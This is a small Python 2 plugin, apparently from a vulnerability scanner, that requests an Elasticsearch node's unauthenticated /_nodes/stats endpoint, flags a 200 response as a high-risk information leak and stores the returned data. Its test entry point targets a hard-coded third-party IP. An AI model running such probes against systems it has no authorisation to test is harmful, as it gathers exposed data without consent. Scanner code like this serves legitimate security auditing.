#!/usr/bin/env python
# encoding: utf-8
from ..t import T

from termcolor import cprint
import requests,urllib2,json,urlparse

class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackresults=''):
        target_url = "http://"+ip+":"+port+"/_nodes/stats"
        result = {}
        result['result']=False
        r=None
        try:
            r=requests.get(url=target_url,timeout=2)
            print "In elasticsearch_nodestate.py and get status code", r.status_code
            if r.status_code == 200:
                result['result'] = True
                result['VerifyInfo'] = {}
                result['VerifyInfo']['type'] = 'Information Unclosed'
                result['VerifyInfo']['URL'] =target_url
                result['VerifyInfo']['payload'] = 'IP:port/_nodes/stats'
                result['VerifyInfo']['result'] = r.text
                result['VerifyInfo']['level'] = '高危(HOLE)'
		cprint(target_url + '存在信息泄漏风险', 'red')
            else:
                pass
        except Exception,e:
            print e.text
        finally:
            if r is not None:
                r.close()
                del r
            return result

if __name__ == '__main__':
    print P().verify(ip='42.120.7.120',port='9200')          
